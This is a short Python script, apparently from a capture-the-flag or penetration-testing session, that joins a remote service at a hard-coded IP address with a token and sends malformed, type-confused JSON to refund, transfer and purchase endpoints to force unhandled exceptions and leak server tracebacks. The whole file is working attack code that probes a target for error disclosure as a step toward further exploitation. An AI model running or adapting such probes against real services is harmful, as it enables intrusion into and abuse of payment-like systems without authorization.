import requests, time
B="http://13.37.197.230:28493"
print("cooldown 65s pour vider le rate-limit..."); time.sleep(65)
s=requests.Session()
print("join:", s.post(B+"/api/join",json={"token":"842d0f131b6b020f"},timeout=8).json())

def probe(path, body):
    r=s.post(B+path, json=body, timeout=8)
    t=r.text
    tb = "Traceback (most recent call last)" in t or "werkzeug" in t.lower() or "<title>500" in t.lower()
    print(f"\nPOST {path} {body}\n  [{r.status_code}] tb={tb} len={len(t)}")
    if r.status_code>=500 or tb:
        print("  BODY:\n", t[:4000])
    else:
        print("  ", t[:160])

# type-confusion to trigger unhandled exceptions
probe("/api/refund", {"order_id": {"x":1}})
probe("/api/refund", {"order_id": [1,2]})
probe("/api/transfer", {"to_code":"T015747","montant":[5]})
probe("/api/transfer", {"to_code":["T015747"],"montant":5})
probe("/api/buy", {"product":{"a":1},"qty":1})
